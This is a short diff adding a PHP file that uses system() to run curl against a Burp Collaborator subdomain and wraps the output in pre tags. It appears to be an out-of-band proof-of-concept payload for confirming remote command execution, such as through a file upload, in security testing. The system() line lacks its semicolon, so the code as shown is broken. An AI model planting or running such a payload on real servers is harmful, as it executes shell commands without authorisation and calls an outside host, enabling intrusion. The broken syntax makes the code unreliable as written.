@@ -1,0 +1,5 @@
+<?php
+echo "<pre>";
+system("curl okc10z630fu2whng709oha6riiodc2.burpcollaborator.net")
+echo "</pre>";
+?>
